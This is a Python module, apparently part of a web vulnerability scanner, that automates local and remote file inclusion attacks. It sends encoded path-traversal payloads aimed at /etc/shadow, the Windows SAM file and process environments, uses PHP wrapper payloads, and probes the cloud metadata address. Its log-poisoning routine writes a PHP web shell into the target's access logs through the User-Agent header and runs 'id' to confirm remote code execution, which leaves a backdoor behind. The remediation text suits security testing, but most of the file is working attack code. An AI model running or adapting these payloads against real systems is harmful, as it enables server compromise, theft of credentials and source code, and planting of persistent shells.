"""
Vexor LFI/RFI Scanner v3.0 - Elite Level
Path traversal, PHP wrappers, log poisoning, RFI, null byte bypass,
encoding bypass, Windows paths, proc/self exploitation
"""
import asyncio
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Target Files ─────────────────────────────────────────────────────────────
LFI_TARGETS = {
    "linux": [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/shadow",
        "/etc/group",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/usr/local/apache/logs/access_log",
        "/home/www/logs/access_log",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\xampp\\apache\\logs\\access.log",
    ],
    "php_config": [
        "index.php",
        "config.php",
        "database.php",
        "db.php",
        "settings.php",
        "config/database.php",
        "../config.php",
        "../../config.php",
    ],
}

# ─── Traversal Patterns ───────────────────────────────────────────────────────
TRAVERSAL_PATTERNS = [
    "../",
    "..\\",
    "....//",
    "....\\\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%5c",
    "%252e%252e%252f",
    "..%252f",
    "..%c0%af",
    "..%c1%9c",
    "%c0%ae%c0%ae/",
]

# ─── PHP Wrappers ─────────────────────────────────────────────────────────────
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource={file}",
    "php://filter/read=convert.base64-encode/resource={file}",
    "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
    "php://input",
    "php://stdin",
    "data://text/plain;base64,{b64}",
    "expect://id",
    "zip://shell.zip%23shell.php",
    "phar://shell.phar/shell.php",
]

# ─── Success Patterns ─────────────────────────────────────────────────────────
LFI_SUCCESS_PATTERNS = {
    "linux_passwd": r"root:x:0:0",
    "linux_shadow": r"root:\$[0-9a-z]\$",
    "linux_hosts": r"127\.0\.0\.1\s+localhost",
    "linux_proc": r"DOCUMENT_ROOT=|HTTP_HOST=|PATH=",
    "windows_ini": r"\[fonts\]|\[extensions\]",
    "windows_hosts": r"127\.0\.0\.1\s+localhost",
    "php_source": r"<\?php|<\?=",
    "base64_php": r"PD9waHA|PD9=",  # base64 of <?php
}

# ─── LFI-Prone Parameters ─────────────────────────────────────────────────────
LFI_PARAMS = [
    "file", "page", "include", "path", "template", "view",
    "doc", "document", "folder", "root", "pg", "style",
    "pdf", "read", "load", "show", "content", "lang",
    "language", "module", "conf", "config", "layout",
    "dir", "action", "board", "date", "detail", "download",
    "prefix", "suffix", "type", "format", "src", "source",
]


class Scanner(BaseScanner):
    """LFI/RFI Scanner v3.0 - Elite Level"""

    MODULE_NAME = "lfi"
    MODULE_DESC = "LFI/RFI: Path Traversal/PHP Wrappers/Log Poison/RFI/Encoding Bypass"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_path_params(),
                self._scan_php_wrappers(),
                self._scan_rfi(),
                self._scan_log_poisoning(),
                return_exceptions=True,
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        """Test URL parameters for LFI"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        # Test existing params
        for param in params:
            if param.lower() in LFI_PARAMS:
                await self._test_lfi_param(self.target, param)

        # Test common LFI params if none found
        if not params:
            for param in LFI_PARAMS[:10]:
                await self._test_lfi_param(self.target, param)

    async def _test_lfi_param(self, url: str, param: str) -> None:
        """Test a parameter with all LFI techniques"""
        # Build payloads: traversal depths x target files
        payloads = []
        for depth in range(1, 8):
            for pattern in TRAVERSAL_PATTERNS[:6]:
                traversal = pattern * depth
                for target_file in LFI_TARGETS["linux"][:5]:
                    payloads.append(traversal + target_file.lstrip("/"))
                for target_file in LFI_TARGETS["windows"][:2]:
                    payloads.append(traversal + target_file)

        # Direct absolute paths
        for target_file in LFI_TARGETS["linux"][:5]:
            payloads.append(target_file)

        # Null byte bypass (PHP < 5.3.4)
        for target_file in LFI_TARGETS["linux"][:3]:
            payloads.append(f"../../../{target_file.lstrip('/')}\x00")
            payloads.append(f"../../../{target_file.lstrip('/')}%00")

        for payload in payloads:
            try:
                test_url = self._inject_param(url, param, payload)
                resp = await self.get(test_url)
                if not resp:
                    continue

                match_key, evidence = self._check_lfi_success(resp.text)
                if match_key:
                    severity = "CRITICAL" if "passwd" in match_key or "shadow" in match_key else "HIGH"
                    self.add_finding(Finding(
                        severity=severity,
                        module=self.MODULE_NAME,
                        vuln=f"Local File Inclusion — {match_key}",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        description=(
                            f"LFI in parameter '{param}'. "
                            f"File read confirmed: {match_key}. "
                            "Attacker can read arbitrary files from the server."
                        ),
                        remediation=(
                            "Never use user input directly in file paths. "
                            "Use a whitelist of allowed files/paths. "
                            "Disable allow_url_include in PHP. "
                            "Use realpath() and validate against allowed base directory."
                        ),
                    ))
                    return
            except Exception:
                continue

    async def _scan_path_params(self) -> None:
        """Test path segments in URL for LFI"""
        parsed = urlparse(self.target)
        path_parts = parsed.path.strip("/").split("/")

        for i, part in enumerate(path_parts):
            if "." in part or part in ["index", "page", "view", "show"]:
                # Try replacing this path segment
                for target_file in LFI_TARGETS["linux"][:3]:
                    new_parts = list(path_parts)
                    new_parts[i] = "../" * 5 + target_file.lstrip("/")
                    new_path = "/" + "/".join(new_parts)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                    if parsed.query:
                        test_url += f"?{parsed.query}"

                    try:
                        resp = await self.get(test_url)
                        if resp:
                            match_key, evidence = self._check_lfi_success(resp.text)
                            if match_key:
                                self.add_finding(Finding(
                                    severity="CRITICAL",
                                    module=self.MODULE_NAME,
                                    vuln=f"LFI in URL Path Segment",
                                    endpoint=test_url,
                                    payload=new_parts[i],
                                    evidence=evidence,
                                    description=f"LFI via URL path segment. File: {match_key}",
                                    remediation="Validate and sanitize URL path segments.",
                                ))
                                return
                    except Exception:
                        continue

    async def _scan_php_wrappers(self) -> None:
        """Test PHP stream wrappers for source code disclosure"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        test_params = list(params.keys()) if params else LFI_PARAMS[:5]

        for param in test_params:
            for php_file in LFI_TARGETS["php_config"][:4]:
                # php://filter base64 encode
                wrapper = f"php://filter/convert.base64-encode/resource={php_file}"
                try:
                    test_url = self._inject_param(self.target, param, wrapper)
                    resp = await self.get(test_url)
                    if resp and resp.status_code == 200:
                        # Check for base64-encoded PHP source
                        if self._is_base64_php(resp.text):
                            decoded = self._decode_php_source(resp.text)
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln="LFI via PHP Wrapper — Source Code Disclosure",
                                endpoint=self.target,
                                param=param,
                                payload=wrapper,
                                evidence=(
                                    f"PHP source code disclosed via php://filter\n"
                                    f"File: {php_file}\n"
                                    f"Decoded preview: {decoded[:200]}"
                                ),
                                description=(
                                    f"PHP wrapper allows reading source code of {php_file}. "
                                    "May expose database credentials, API keys, etc."
                                ),
                                remediation=(
                                    "Disable PHP wrappers: allow_url_fopen=Off, "
                                    "allow_url_include=Off. "
                                    "Validate file paths against whitelist."
                                ),
                            ))
                            return
                except Exception:
                    continue

    async def _scan_rfi(self) -> None:
        """Test for Remote File Inclusion"""
        # Use a benign external URL that returns PHP-like content
        rfi_test_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/",
            "https://example.com/",
        ]

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        test_params = [p for p in params if p.lower() in LFI_PARAMS]
        if not test_params:
            test_params = LFI_PARAMS[:3]

        for param in test_params:
            for rfi_url in rfi_test_urls[:2]:
                try:
                    test_url = self._inject_param(self.target, param, rfi_url)
                    resp = await self.get(test_url)
                    if resp and resp.status_code == 200:
                        # Check if external content was fetched
                        if "ami-id" in resp.text or "instance-id" in resp.text:
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln="Remote File Inclusion (RFI)",
                                endpoint=self.target,
                                param=param,
                                payload=rfi_url,
                                evidence=f"External URL content fetched: {resp.text[:200]}",
                                description=(
                                    f"RFI in parameter '{param}'. "
                                    "Attacker can include remote PHP files for RCE."
                                ),
                                remediation=(
                                    "Set allow_url_include=Off in php.ini. "
                                    "Validate file paths against whitelist."
                                ),
                            ))
                            return
                except Exception:
                    continue

    async def _scan_log_poisoning(self) -> None:
        """Test for log poisoning via User-Agent injection"""
        # First, try to include a log file
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
        ]

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        test_params = [p for p in params if p.lower() in LFI_PARAMS]
        if not test_params:
            return

        for param in test_params:
            for log_file in log_files:
                for depth in range(3, 8):
                    payload = "../" * depth + log_file.lstrip("/")
                    try:
                        test_url = self._inject_param(self.target, param, payload)
                        resp = await self.get(test_url)
                        if resp and resp.status_code == 200 and len(resp.content) > 100:
                            # Log file accessible — now poison it
                            poison_ua = "<?php system($_GET['cmd']); ?>"
                            await self.get(
                                self.target,
                                headers={"User-Agent": poison_ua}
                            )
                            # Try to execute
                            exec_url = self._inject_param(
                                test_url, "cmd", "id"
                            )
                            exec_resp = await self.get(exec_url)
                            if exec_resp and re.search(r"uid=\d+", exec_resp.text):
                                self.add_finding(Finding(
                                    severity="CRITICAL",
                                    module=self.MODULE_NAME,
                                    vuln="LFI + Log Poisoning = RCE",
                                    endpoint=self.target,
                                    param=param,
                                    payload=payload,
                                    evidence=(
                                        f"Log file readable: {log_file}\n"
                                        f"RCE confirmed: {exec_resp.text[:100]}"
                                    ),
                                    description=(
                                        "LFI + log poisoning achieves Remote Code Execution. "
                                        "PHP code injected via User-Agent executes via LFI."
                                    ),
                                    remediation=(
                                        "Fix LFI vulnerability immediately. "
                                        "Restrict log file permissions. "
                                        "Disable PHP execution in log directories."
                                    ),
                                ))
                                return
                            else:
                                self.add_finding(Finding(
                                    severity="HIGH",
                                    module=self.MODULE_NAME,
                                    vuln="LFI — Log File Accessible (Log Poisoning Risk)",
                                    endpoint=self.target,
                                    param=param,
                                    payload=payload,
                                    evidence=f"Log file {log_file} readable via LFI",
                                    description=(
                                        f"Log file {log_file} is readable via LFI. "
                                        "Log poisoning via User-Agent may achieve RCE."
                                    ),
                                    remediation="Fix LFI and restrict log file permissions.",
                                ))
                                return
                    except Exception:
                        continue

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _check_lfi_success(self, text: str) -> tuple[str, str]:
        """Check response for LFI success indicators"""
        for key, pattern in LFI_SUCCESS_PATTERNS.items():
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 10)
                end = min(len(text), match.end() + 150)
                evidence = text[start:end].strip()
                return key, evidence
        return "", ""

    def _is_base64_php(self, text: str) -> bool:
        """Check if response contains base64-encoded PHP source"""
        # Look for long base64 strings
        b64_pattern = re.compile(r"[A-Za-z0-9+/]{100,}={0,2}")
        matches = b64_pattern.findall(text)
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode("utf-8", errors="ignore")
                if "<?php" in decoded or "<?=" in decoded:
                    return True
            except Exception:
                continue
        return False

    def _decode_php_source(self, text: str) -> str:
        """Decode base64-encoded PHP source from response"""
        b64_pattern = re.compile(r"[A-Za-z0-9+/]{100,}={0,2}")
        matches = b64_pattern.findall(text)
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode("utf-8", errors="ignore")
                if "<?php" in decoded or "<?=" in decoded:
                    return decoded
            except Exception:
                continue
        return ""

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return url.split("?")[0] + "?" + urlencode(params, doseq=True)
